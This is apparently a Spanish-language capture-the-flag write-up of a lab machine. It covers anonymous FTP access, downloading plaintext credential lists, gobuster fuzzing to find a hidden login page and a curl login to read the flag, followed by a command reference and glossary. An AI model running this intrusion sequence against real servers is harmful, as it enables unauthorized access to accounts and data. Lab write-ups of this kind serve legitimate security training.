// 01

FTP anónimo

1
RECONOCIMIENTO

El escaneo deja dos puertos: 21/tcp (vsftpd 3.0.3) y 80/tcp (Apache 2.4.41), sin ningún título llamativo en la web por defecto. Con FTP abierto, el primer intento siempre es la cuenta anonymous.

2
DESCARGA ANÓNIMA DEL FTP
FTP
$ ftp -inv 10.129.1.15
user anonymous anonymous
ls -la
$ wget -q -r -nH ftp://anonymous:anonymous@10.129.1.15/
230 Login successful.
-rw-r--r-- 1 ftp ftp 24 allowed.userlist
-rw-r--r-- 1 ftp ftp 64 allowed.userlist.passwd
3
EMPAREJAR USUARIOS Y CONTRASEÑAS

Las dos listas van en el mismo orden: la fila N de una es la contraseña de la fila N de la otra.

allowed.userlist allowed.userlist.passwd
aron root
pwnmeow Supersecretpassword1
egotisticalsw @BaASD&9032123sADS
admin rKXM59ESxesUFHAd

// CREDENCIALES EN TEXTO CLARO

Dónde: FTP anónimo con escritura/lectura libre del directorio raíz.
Qué permite: descargar dos listas en texto claro cuya cuarta fila es admin:rKXM59ESxesUFHAd, la credencial de administración de la web — sin tocar el servicio HTTP todavía.

// 02

Fuzzing y login

4
BUSCAR EL LOGIN OCULTO

La web por defecto no enlaza ningún panel: toca fuzzear directorios y ficheros.

GOBUSTER
$ gobuster dir -u http://10.129.1.15/ -w /usr/share/wordlists/dirb/common.txt -t 30
/dashboard (Status: 301)
/login.php (Status: 200)

// NOTA

/dashboard/ redirige (301) sin pedir login en la propia respuesta inicial, pero /login.php no estaba en la wordlist por defecto — hubo que probar nombres a mano a partir del contexto («login», «panel», «admin»).

5
AUTENTICARSE EN EL PANEL
CURL
$ curl -s -c /tmp/cr.txt -b /tmp/cr.txt -L \
--data-urlencode "Username=admin" \
--data-urlencode "Password=rKXM59ESxesUFHAd" \
--data-urlencode "Submit=Login" \
http://10.129.1.15/login.php
HTTP/1.1 302 Found
Location: /dashboard/index.php

// OJO

El formulario tiene un botón name="Submit" value="Login". Si el POST no incluye Submit=Login, el servidor devuelve otra vez la página de login (código 200) aunque las credenciales sean correctas — parece un fallo de contraseña y no lo es.

6
LEER LA FLAG
FLAG
$ curl -s -b /tmp/cr.txt http://10.129.1.15/dashboard/index.php | grep -oE '[a-f0-9]{32}'
[flag oculta]

// FLAG

[flag oculta] — servida directamente por el dashboard tras el login. Ruta completa: FTP anónimo → listas de credenciales → gobuster → /login.php → admin:rKXM59ESxesUFHAd → dashboard. Tiempo total: ~20 minutos.

// 03

Referencia Comandos

ftp / wget
ftp -inv <IP> · wget -r -nH ftp://user:pass@IP/
Se conecta y descarga en bloque el contenido de un FTP anónimo.
  • -inv → Modo no interactivo, sin auto-login, con mensajes.
  • -r -nH → Descarga recursiva sin crear la carpeta del host.
gobuster dir
gobuster dir -u <URL> -w <wordlist> -t 30
Fuzzing de directorios y archivos por fuerza bruta de rutas conocidas.
  • -u → URL base objetivo.
  • -w → Wordlist de rutas a probar.
  • -t → Número de hilos concurrentes.
curl --data-urlencode
curl -c cookies -b cookies -L --data-urlencode "campo=valor" <URL>
Envía un formulario POST con las cookies de sesión guardadas y reutilizadas.
  • -c / -b → Guarda / envía las cookies de sesión (cookie jar).
  • -L → Sigue redirecciones (el 302 tras el login).
  • --data-urlencode → Codifica cada campo del formulario correctamente.

// 04

Glosario

FTP anónimo
Configuración de vsftpd que acepta el usuario anonymous sin contraseña real. Muy común como primer vector en máquinas de nivel introductorio.
gobuster
Herramienta en Go para fuerza bruta de directorios, archivos, subdominios y vhosts contra un servidor web.
Cookie jar
Archivo donde curl guarda las cookies recibidas (-c) para reenviarlas (-b) en peticiones siguientes, simulando una sesión de navegador.
Redirección 302
Código HTTP que indica un recurso temporalmente en otra ubicación. Un login correcto suele devolver un 302 hacia el panel; un 200 que repite el formulario normalmente significa que algo del POST falta.
Panel de administración
Interfaz privada para gestionar una aplicación. Si no está enlazada desde la web pública, no significa que esté protegida: solo está sin publicitar («security through obscurity»).
